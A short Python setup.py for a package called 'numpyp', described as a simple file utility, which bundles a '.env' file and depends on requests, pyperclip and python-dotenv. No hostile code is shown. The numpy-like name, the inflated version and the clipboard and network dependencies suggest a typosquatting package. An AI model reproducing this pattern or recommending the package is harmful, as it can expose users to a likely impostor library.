from setuptools import setup, find_packages


def readme():
  with open('README.md', encoding='utf-8') as f:
    return f.read()


setup(
  name='numpyp',
  version='0.7.99',
  description='This is the simplest module for quick work with files.',
  license='MIT',
  long_description=readme(),
  long_description_content_type='text/markdown',
  packages=find_packages(),
  include_package_data=True,
  package_data={
    'numpyp': ['.env']
    },
  install_requires=[
    'requests','pyperclip','python-dotenv'
  ],
)



